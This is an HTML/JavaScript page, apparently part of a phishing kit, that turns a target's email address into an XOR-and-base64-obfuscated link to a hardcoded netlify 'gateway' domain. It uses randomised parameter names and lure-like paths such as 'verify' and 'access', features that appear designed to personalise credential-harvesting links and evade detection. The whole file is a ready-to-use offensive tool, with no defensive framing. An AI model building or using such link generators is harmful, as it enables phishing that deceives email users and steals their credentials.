<!DOCTYPE html>
<html>
<head>
    <title>Link Generator</title>
    <style>
        body { font-family: Arial; padding: 20px; max-width: 800px; margin: 0 auto; }
        .input-group { margin: 20px 0; }
        input, textarea { width: 100%; padding: 10px; margin: 5px 0; }
        button { background: #067438; color: white; border: none; padding: 12px 24px; cursor: pointer; }
        .result { background: #f5f5f5; padding: 15px; margin: 10px 0; border-radius: 5px; }
        .link { word-break: break-all; font-family: monospace; font-size: 14px; }
    </style>
</head>
<body>
    <h2>ðŸ”’ Obfuscated Link Generator</h2>
    
    <div class="input-group">
        <label>Email Address:</label>
        <input type="email" id="email" placeholder="user@example.com">
    </div>
    
    <div class="input-group">
        <label>Gateway Domain:</label>
        <input type="text" id="domain" value="https://6938061f54ad4700afa82572--relaxed-manatee-b961f6.netlify.app">
    </div>
    
    <button onclick="generateLink()">Generate Obfuscated Link</button>
    
    <div id="output" style="display: none;">
        <div class="result">
            <strong>Email:</strong> <span id="originalEmail"></span><br>
            <strong>Obfuscated Link:</strong><br>
            <div class="link" id="generatedLink"></div>
            <button onclick="copyLink()" style="margin-top: 10px; padding: 8px 16px; font-size: 14px;">Copy Link</button>
        </div>
    </div>
    
    <script>
    function obfuscateEmail(email) {
        // XOR with key 42
        const key = 42;
        let xored = '';
        for (let i = 0; i < email.length; i++) {
            xored += String.fromCharCode(email.charCodeAt(i) ^ key);
        }
        
        // Base64 encode and make URL-safe
        const encoded = btoa(xored);
        return encoded.replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
    }
    
    function generateLink() {
        const email = document.getElementById('email').value.trim();
        const domain = document.getElementById('domain').value.trim().replace(/\/$/, '');
        
        if (!email || !email.includes('@')) {
            alert('Please enter a valid email');
            return;
        }
        
        // Obfuscate email
        const encoded = obfuscateEmail(email);
        
        // Random parameter name
        const params = ['t', 'k', 'r', 's', 'c'];
        const param = params[Math.floor(Math.random() * params.length)];
        
        // Random path
        const paths = ['', 'access', 'verify', 'system'];
        const path = paths[Math.floor(Math.random() * paths.length)];
        
        // Generate link
        let link = path ? `${domain}/${path}` : domain;
        link += `?${param}=${encoded}`;
        
        // Display
        document.getElementById('originalEmail').textContent = email;
        document.getElementById('generatedLink').textContent = link;
        document.getElementById('output').style.display = 'block';
        
        // Store for copying
        window.lastGeneratedLink = link;
    }
    
    function copyLink() {
        navigator.clipboard.writeText(window.lastGeneratedLink).then(() => {
            alert('Link copied to clipboard!');
        });
    }
    
    // Allow Enter key
    document.getElementById('email').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') generateLink();
    });
    </script>
</body>
</html>
